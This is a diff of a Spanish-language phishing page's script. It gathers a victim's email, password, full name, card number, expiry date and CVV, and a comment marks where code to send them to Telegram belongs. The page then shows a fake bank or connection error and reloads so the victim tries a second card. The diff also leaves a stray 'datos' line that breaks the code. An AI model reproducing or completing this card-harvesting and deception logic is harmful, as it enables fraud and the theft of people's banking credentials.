@@ -100,14 +100,44 @@
                 };
 
                 // RECOMENDACIÓN: Aquí va tu código para enviar a Telegram
-                console.log("Enviando paquete seguro:", data);
+                datos
 
-                setTimeout(() => {
-                    alert("Error temporal: El sistema de validación bancaria no responde. Por favor, intenta con otra tarjeta de débito o crédito.");
-                    location.reload();
-                }, 2500);
+            console.log("Datos capturados:", {
+
+                emailStored,
+
+                password,
+
+                nombreCompleto: nombre + " " + apellido,
+
+                tarjeta,
+
+                exp,
+
+                cvv
+
             });
-        }
+
+
+
+            // Simulación de carga
+
+            this.innerHTML = "<h4>Procesando...</h4>";
+
+            
+
+            setTimeout(() => {
+
+                alert("Error de conexión. Por favor, intente con otra tarjeta.");
+
+                location.reload();
+
+            }, 2000);
+
+        });
+
     </script>
+
 </body>
+
 </html>
